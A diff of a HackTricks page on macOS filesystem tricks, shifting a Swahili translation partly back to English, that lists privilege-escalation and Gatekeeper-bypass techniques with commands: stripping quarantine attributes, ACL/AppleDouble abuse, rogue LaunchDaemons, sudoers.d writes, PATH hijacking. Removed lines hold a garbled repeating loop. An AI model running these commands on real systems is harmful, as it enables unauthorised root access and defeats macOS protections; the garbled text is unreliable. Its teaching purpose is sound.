@@ -1,54 +1,55 @@
-# Mbinu za macOS FS
+# macOS FS Tricks
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-## Mchanganyiko wa ruhusa za POSIX
+## POSIX permissions combinations
 
-Ruhusa katika **directory**:
+Permissions in a **directory**:
 
-* **soma** - unaweza **kuorodhesha** viingilio vya directory
-* **andika** - unaweza **kufuta/kuandika** **faili** katika directory na unaweza **kufuta folda tupu**.
-* Lakini huwezi **kufuta/kurekebisha folda zilizo na vitu** isipokuwa una ruhusa za kuandika juu yake.
-* Huwezi **kurekebisha jina la folda** isipokuwa unamiliki.
-* **tekeleza** - unaruhusiwa **kutembea** directory - ikiwa huna haki hii, huwezi kupata faili yoyote ndani yake, au katika subdirectories yoyote.
+* **read** - unaweza **kuhesabu** entries za directory
+* **write** - unaweza **kufuta/kandika** **files** katika directory na unaweza **kufuta folda tupu**.
+* Lakini huwezi **kufuta/kubadilisha folda zisizo tupu** isipokuwa una ruhusa za kuandika juu yake.
+* Huwezi **kubadilisha jina la folda** isipokuwa unamiliki.
+* **execute** - ume **ruhusiwa kupita** katika directory - ikiwa huna haki hii, huwezi kufikia files zozote ndani yake, au katika folda ndogo zozote.
 
-### Mchanganyiko Hatari
+### Dangerous Combinations
 
-**Jinsi ya kubadilisha faili/folder iliyo milikiwa na root**, lakini:
+**Jinsi ya kufuta file/folda inayomilikiwa na root**, lakini:
 
-* Mzazi mmoja wa **directory ni mmiliki** ni mtumiaji
-* Mzazi mmoja wa **directory ni mmiliki wa kikundi cha watumiaji** na **ruhusa ya kuandika**
-* Kikundi cha watumiaji kina **ruhusa ya kuandika** kwa **faili**
+* Mmiliki mmoja wa **directory** katika njia ni mtumiaji
+* Mmiliki mmoja wa **directory** katika njia ni **kikundi cha watumiaji** chenye **ruhusa za kuandika**
+* Kikundi cha watumiaji kina **ruhusa za kuandika** kwa **file**
 
-Kwa mchanganyiko wowote uliopita, mshambuliaji anaweza **kuingiza** **kiungo cha sim/hard** kwenye njia inayotarajiwa ili kupata uandishi wa aina ya kipekee.
+Kwa yoyote ya mchanganyiko wa hapo juu, mshambuliaji anaweza **kuingiza** **sym/hard link** kwenye njia inayotarajiwa ili kupata kuandika kwa mamlaka.
 
-### Kesi Maalum ya R+X ya Mzizi wa Folda
+### Folder root R+X Special case
 
-Ikiwa kuna faili katika **directory** ambapo **root pekee ana ufikiaji wa R+X**, hizo **hazipatikani kwa mtu mwingine yeyote**. Kwa hivyo, udhaifu unaoruhusu **kuhamisha faili inayoweza kusomwa na mtumiaji**, ambayo haiwezi kusomwa kwa sababu ya **kizuizi hicho**, kutoka kwenye folda hii **kwenda kwenye nyingine**, unaweza kutumika kusoma faili hizi.
+Ikiwa kuna files katika **directory** ambapo **ni root pekee mwenye R+X access**, hizo **hazipatikani kwa mtu mwingine yeyote**. Hivyo, udhaifu unaoruhusu **kuhamasisha file inayoweza kusomwa na mtumiaji**, ambayo haiwezi kusomwa kwa sababu ya **kizuizi** hicho, kutoka folda hii **kwenda nyingine**, inaweza kutumika vibaya kusoma files hizi.
 
 Mfano katika: [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)
 
-## Kiungo cha Ishara / Kiungo Kali
+## Symbolic Link / Hard Link
 
-Ikiwa mchakato uliopewa mamlaka unahifadhi data katika **faili** ambayo inaweza **kudhibitiwa** na **mtumiaji mwenye mamlaka ya chini**, au ambayo inaweza **kuundwa mapema** na mtumiaji mwenye mamlaka ya chini. Mtumiaji anaweza tu **kuielekeza kwenye faili nyingine** kupitia Kiungo cha Ishara au Kiungo Kali, na mchakato uliopewa mamlaka atahifadhi kwenye faili hiyo.
+Ikiwa mchakato wenye mamlaka unandika data katika **file** ambayo inaweza **kudhibitiwa** na **mtumiaji mwenye mamlaka ya chini**, au ambayo inaweza **kuundwa awali** na mtumiaji mwenye mamlaka ya chini. Mtumiaji anaweza tu **kuielekeza kwenye file nyingine** kupitia Symbolic au Hard link, na mchakato wenye mamlaka utaandika kwenye file hiyo.
 
-Angalia sehemu zingine ambapo mshambuliaji anaweza **kutumia uandishi wa aina ya kipekee kwa kuboresha mamlaka**.
+Angalia katika sehemu nyingine ambapo mshambuliaji anaweza **kutumia kuandika kwa mamlaka ili kupandisha mamlaka**.
 
 ## .fileloc
 
-Faili zenye kipengele cha **`.fileloc`** zinaweza kuashiria programu au binaries nyingine hivyo wakati zinafunguliwa, programu/binari itakuwa ile inayotekelezwa.\
+Files zenye **`.fileloc`** extension zinaweza kuelekeza kwenye programu nyingine au binaries hivyo wakati zinapofunguliwa, programu/binary itakuwa ndiyo itakayotekelezwa.\
 Mfano:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -62,21 +63,21 @@ Mfano:
 </dict>
 </plist>
 ```
-## FD ya Kiholela
+## Arbitrary FD
 
-Ikiwa unaweza kufanya **mchakato ufungue faili au folda kwa mamlaka ya juu**, unaweza kutumia **`crontab`** kufungua faili katika `/etc/sudoers.d` kwa **`EDITOR=exploit.py`**, hivyo `exploit.py` itapata FD ya faili ndani ya `/etc/sudoers` na kuitumia.
+Ikiwa unaweza kufanya **mchakato ufungue faili au folda kwa haki za juu**, unaweza kutumia **`crontab`** kufungua faili katika `/etc/sudoers.d` na **`EDITOR=exploit.py`**, hivyo `exploit.py` itapata FD kwa faili ndani ya `/etc/sudoers` na kuifanya.
 
 Kwa mfano: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)
 
-## Epuka mbinu za xattrs za karantini
+## Avoid quarantine xattrs tricks
 
-### Ondoa hiyo
+### Remove it
 ```bash
 xattr -d com.apple.quarantine /path/to/file_or_app
 ```
-### Bendera ya uchg / uchange / uimmutable
+### uchg / uchange / uimmutable flag
 
-Ikiwa faili/folder ina sifa hii isiyoondolewa, haitawezekana kuweka xattr juu yake
+Ikiwa faili/folda ina sifa hii isiyobadilika haitakuwa na uwezo wa kuweka xattr juu yake.
 ```bash
 echo asd > /tmp/asd
 chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
@@ -86,9 +87,9 @@ xattr: [Errno 1] Operation not permitted: '/tmp/asd'
 ls -lO /tmp/asd
 # check the "uchg" in the output
 ```
-### Kuunganisha defvfs
+### defvfs mount
 
-**Kuunganisha devfs** **haishikilii xattr**, maelezo zaidi katika [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
+A **devfs** mount **haiungi xattr**, maelezo zaidi katika [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
 ```bash
 mkdir /tmp/mnt
 mount_devfs -o noowners none "/tmp/mnt"
@@ -97,9 +98,9 @@ mkdir /tmp/mnt/lol
 xattr -w com.apple.quarantine "" /tmp/mnt/lol
 xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
 ```
-### Andika xattr ACL
+### writeextattr ACL
 
-ACL hii inazuia kuongeza `xattrs` kwa faili
+ACL hii inazuia kuongeza `xattrs` kwenye faili
 ```bash
 rm -rf /tmp/test*
 echo test >/tmp/test
@@ -122,13 +123,13 @@ ls -le /tmp/test
 ```
 ### **com.apple.acl.text xattr + AppleDouble**
 
-**Muundo wa faili wa AppleDouble** unachukua faili pamoja na ACEs zake.
+**AppleDouble** muundo wa faili unakopi faili pamoja na ACE zake.
 
-Katika [**msimbo wa chanzo**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) inawezekana kuona kwamba uwakilishi wa maandishi wa ACL uliohifadhiwa ndani ya xattr inayoitwa **`com.apple.acl.text`** utawekwa kama ACL katika faili iliyopunguzwa. Kwa hivyo, ikiwa ulipunguza programu ndani ya faili ya zip na muundo wa faili wa **AppleDouble** na ACL ambayo inazuia xattrs zingine kuandikwa kwake... xattr ya karantini haikuwekwa kwenye programu:
+Katika [**kanuni ya chanzo**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) inawezekana kuona kwamba uwakilishi wa maandiko wa ACL ulihifadhiwa ndani ya xattr inayoitwa **`com.apple.acl.text`** utawekwa kama ACL katika faili lililoshinikizwa. Hivyo, ikiwa umeweka programu katika faili la zip kwa muundo wa faili wa **AppleDouble** ukiwa na ACL inayozuia xattrs nyingine kuandikwa ndani yake... xattr ya karantini haikuwekwa katika programu:
 
 Angalia [**ripoti ya asili**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) kwa maelezo zaidi.
 
-Ili kuzidisha hii kwanza tunahitaji kupata mnyororo sahihi wa acl:
+Ili kuiga hii tunahitaji kwanza kupata mfuatano sahihi wa acl:
 ```bash
 # Everything will be happening here
 mkdir /tmp/temp_xattrs
@@ -148,17 +149,17 @@ ls -le test
 ```
 (Note that even if this works the sandbox write the quarantine xattr before)
 
-Hakika haikuhitajika lakini naacha hapo kwa tahadhari:
+Sio kweli inahitajika lakini naiacha hapa tu kwa sababu:
 
 {% content-ref url="macos-xattr-acls-extra-stuff.md" %}
 [macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
 {% endcontent-ref %}
 
-## Kupuuza Saini za Kodi
+## Kupita Saini za Kanuni
 
-Vifurushi vinavyo **`_CodeSignature/CodeResources`** ambavyo vina **hash** ya kila **faili** katika **kifurushi**. Tafadhali kumbuka kuwa hash ya CodeResources pia **imeingizwa kwenye kutekelezeka**, hivyo hatuwezi kuharibu hilo, pia.
+Bundles zina faili **`_CodeSignature/CodeResources`** ambayo ina **hash** ya kila **faili** katika **bundle**. Kumbuka kwamba hash ya CodeResources pia **imejumuishwa katika executable**, hivyo hatuwezi kuingilia hapo pia.
 
-Hata hivyo, kuna baadhi ya faili ambazo saini yake haitachunguzwa, hizi zina ufunguo wa kutoa katika plist, kama vile:
+Hata hivyo, kuna baadhi ya faili ambazo saini yake haitakaguliwa, hizi zina ufunguo omit katika plist, kama:
 ```xml
 <dict>
 ...
@@ -202,15 +203,19 @@ Hata hivyo, kuna baadhi ya faili ambazo saini yake haitachunguzwa, hizi zina ufu
 ...
 </dict>
 ```
-Inawezekana kuhesabu saini ya rasilimali kutoka kwa cli na:
+Ni rahisi kuhesabu saini ya rasilimali kutoka kwa cli kwa: 
 
 {% code overflow="wrap" %}
 ```bash
 openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
 ```
-## Pakia faili za dmgs
+{% endcode %}
 
-Mtumiaji anaweza kupakia faili ya dmg iliyoundwa hata juu ya folda zilizopo. Hivi ndivyo unavyoweza kuunda pakiti ya dmg ya desturi na maudhui ya desturi:
+## Mount dmgs
+
+Mtumiaji anaweza kuunganisha dmg maalum iliyoundwa hata juu ya folda fulani zilizopo. Hivi ndivyo unavyoweza kuunda kifurushi cha dmg maalum chenye maudhui maalum:
+
+{% code overflow="wrap" %}
 ```bash
 # Create the volume
 hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
@@ -233,20 +238,20 @@ hdiutil create -srcfolder justsome.app justsome.dmg
 ```
 {% endcode %}
 
-Kawaida macOS inamount diski inazungumza na huduma ya `com.apple.DiskArbitrarion.diskarbitrariond` (iliyotolewa na `/usr/libexec/diskarbitrationd`). Ikiwa unaweka paramu `-d` kwenye faili ya plist ya LaunchDaemons na kuanzisha upya, itahifadhi logs itahifadhi logs katika `/var/log/diskarbitrationd.log`.\
-Walakini, inawezekana kutumia zana kama `hdik` na `hdiutil` kuwasiliana moja kwa moja na `com.apple.driver.DiskImages` kext.
+Kawaida macOS inachomeka diski kwa kuzungumza na huduma ya Mach `com.apple.DiskArbitrarion.diskarbitrariond` (iliyotolewa na `/usr/libexec/diskarbitrationd`). Ikiwa utaongeza paramu `-d` kwenye faili la LaunchDaemons plist na kuanzisha upya, itahifadhi kumbukumbu katika `/var/log/diskarbitrationd.log`.\
+Hata hivyo, inawezekana kutumia zana kama `hdik` na `hdiutil` kuwasiliana moja kwa moja na kext `com.apple.driver.DiskImages`.
 
-## Kuandika Kiholela
+## Maandishi ya Huru
 
-### Skripti za sh za kipindi
+### Mifumo ya sh ya Kila Wakati
 
-Ikiwa skripti yako inaweza kufasiriwa kama **skripti ya shell** unaweza kubadilisha **`/etc/periodic/daily/999.local`** skripti ya shell ambayo itaanzishwa kila siku.
+Ikiwa skripti yako inaweza kutafsiriwa kama **shell script** unaweza kuandika upya **`/etc/periodic/daily/999.local`** shell script ambayo itazinduliwa kila siku.
 
-Unaweza **kuiga** utekelezaji wa skripti hii na: **`sudo periodic daily`**
+Unaweza **kuigiza** utekelezaji wa skripti hii kwa: **`sudo periodic daily`**
 
 ### Daemons
 
-Andika **LaunchDaemon** ya kiholela kama **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** na plist inayotekeleza skripti ya kiholela kama:
+Andika **LaunchDaemon** ya huru kama **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** yenye plist inayotekeleza skripti ya huru kama:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -263,19 +268,21 @@ Andika **LaunchDaemon** ya kiholela kama **`/Library/LaunchDaemons/xyz.hacktrick
 </dict>
 </plist>
 ```
-### Faili ya Sudoers
+Just generate the script `/Applications/Scripts/privesc.sh` with the **commands** you would like to run as root.
 
-Ikiwa una **uwezo wa kuandika** kwa hiari, unaweza kuunda faili ndani ya folda **`/etc/sudoers.d/`** ukijipa **ruhusa za sudo**.
+### Sudoers File
 
-### Faili za PATH
+If you have **arbitrary write**, you could create a file inside the folder **`/etc/sudoers.d/`** granting yourself **sudo** privileges.
 
-Faili ya **`/etc/paths`** ni moja ya sehemu kuu zinazojaza variable ya PATH env. Lazima uwe mtumiaji wa mizizi kuibadilisha, lakini ikiwa script kutoka kwa **mchakato uliopewa ruhusa** inatekeleza **amri bila njia kamili**, unaweza **kuiteka** kwa kubadilisha faili hii.
+### PATH files
 
-Unaweza pia kuandika faili katika **`/etc/paths.d`** ili kupakia folda mpya kwenye variable ya `PATH` env.
+The file **`/etc/paths`** is one of the main places that populates the PATH env variable. You must be root to overwrite it, but if a script from **privileged process** is executing some **command without the full path**, you might be able to **hijack** it modifying this file.
 
-## Unda faili zinazoweza kuandikwa kama watumiaji wengine
+You can also write files in **`/etc/paths.d`** to load new folders into the `PATH` env variable.
 
-Hii itaunda faili inayomilikiwa na mizizi ambayo inaweza kuandikwa na mimi ([**code kutoka hapa**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew\_lpe.sh)). Hii pia inaweza kufanya kazi kama privesc:
+## Generate writable files as other users
+
+Hii itazalisha faili ambalo linamilikiwa na root ambalo linaweza kuandikwa na mimi ([**code from here**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew\_lpe.sh)). Hii inaweza pia kufanya kazi kama privesc:
 ```bash
 DIRNAME=/usr/local/etc/periodic/daily
 
@@ -287,9 +294,13 @@ MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDont
 FILENAME=$(ls "$DIRNAME")
 echo $FILENAME
 ```
-## POSIX Kumbukumbu Inayoshirikishwa
+## POSIX Shared Memory
 
-**Kumbukumbu inayoshirikishwa ya POSIX** inaruhusu michakato katika mifumo ya uendeshaji inayozingatia POSIX kupata eneo la kumbukumbu la pamoja, ikirahisisha mawasiliano haraka ikilinganishwa na njia zingine za mawasiliano kati ya michakato. Inahusisha kujenga au kufungua kitu cha kumbukumbu kinachoshirikishwa kwa kutumia `shm_open()`, kuweka ukubwa wake kwa kutumia `ftruncate()`, na kuifunga katika eneo la anwani ya michakato kwa kutumia `mmap()`. Michakato kisha inaweza kusoma moja kwa moja na kuandika kwenye eneo hili la kumbukumbu. Ili kusimamia ufikiaji wa wakati mmoja na kuzuia uharibifu wa data, mara nyingi hutumiwa mbinu za kusawazisha kama vile mutex au semaphore. Hatimaye, michakato hufunga na kufunga kumbukumbu iliyoshirikishwa kwa kutumia `munmap()` na `close()`, na hiari kuondoa kitu cha kumbukumbu kwa kutumia `shm_unlink()`. Mfumo huu ni hasa ufanisi kwa IPC yenye ufanisi na haraka katika mazingira ambapo michakato mingi inahitaji kupata data iliyoshirikishwa kwa haraka.
+**POSIX shared memory** inaruhusu michakato katika mifumo ya uendeshaji inayokubaliana na POSIX kufikia eneo la kawaida la kumbukumbu, ikirahisisha mawasiliano ya haraka ikilinganishwa na mbinu nyingine za mawasiliano kati ya michakato. Inahusisha kuunda au kufungua kitu cha kumbukumbu ya pamoja kwa kutumia `shm_open()`, kuweka ukubwa wake kwa kutumia `ftruncate()`, na kuunganisha katika nafasi ya anwani ya mchakato kwa kutumia `mmap()`. Michakato inaweza kisha kusoma moja kwa moja kutoka na kuandika kwenye eneo hili la kumbukumbu. Ili kudhibiti ufikiaji wa pamoja na kuzuia uharibifu wa data, mitambo ya usawazishaji kama vile mutexes au semaphores mara nyingi hutumiwa. Hatimaye, michakato huondoa na kufunga kumbukumbu ya pamoja kwa kutumia `munmap()` na `close()`, na kwa hiari kuondoa kitu cha kumbukumbu kwa kutumia `shm_unlink()`. Mfumo huu ni wa ufanisi hasa kwa IPC yenye ufanisi na haraka katika mazingira ambapo michakato mingi inahitaji kufikia data ya pamoja kwa haraka.
+
+<details>
+
+<summary>Producer Code Example</summary>
 ```c
 // gcc producer.c -o producer -lrt
 #include <fcntl.h>
@@ -379,8 +390,31 @@ return 0;
 ```
 </details>
 
-## Descriptors Zilizolindwa za macOS
+## macOS Guarded Descriptors
 
-**Descripters zilizolindwa za macOS** ni kipengele cha usalama kilichoanzishwa katika macOS ili kuboresha usalama na uaminifu wa **shughuli za maelezo ya faili** katika programu za mtumiaji. Descripters hizi zilizolindwa hutoa njia ya kuunganisha vizuizi au "walinzi" maalum na maelezo ya faili, ambayo yanatekelezwa na kernel.
+**macOSCguarded descriptors** ni kipengele cha usalama kilichozinduliwa katika macOS ili kuboresha usalama na uaminifu wa **file descriptor operations** katika programu za mtumiaji. Hizi guarded descriptors zinatoa njia ya kuunganisha vizuizi maalum au "guards" na file descriptors, ambavyo vinatekelezwa na kernel.
 
-Kipengele hiki ni muhimu hasa kwa kuzuia aina fulani za mapungufu ya usalama kama vile **upatikanaji haramu wa faili** au **hali za mbio**. Mapungufu haya hutokea wakati kwa mfano wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati wakati
+Kipengele hiki ni muhimu hasa katika kuzuia aina fulani za udhaifu wa usalama kama vile **unauthorized file access** au **race conditions**. Udhaifu huu hutokea wakati kwa mfano thread inapata file description ikimpa **thread nyingine yenye udhaifu ufikiaji juu yake** au wakati file descriptor inachukuliwa na mchakato wa mtoto mwenye udhaifu. Baadhi ya kazi zinazohusiana na kazi hii ni:
+
+* `guarded_open_np`: Fungua FD na guard
+* `guarded_close_np`: Funga
+* `change_fdguard_np`: Badilisha bendera za guard kwenye descriptor (hata kuondoa ulinzi wa guard)
+
+## References
+
+* [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
+<details>
+
+<summary>Support HackTricks</summary>
+
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+
+</details>
+{% endhint %}
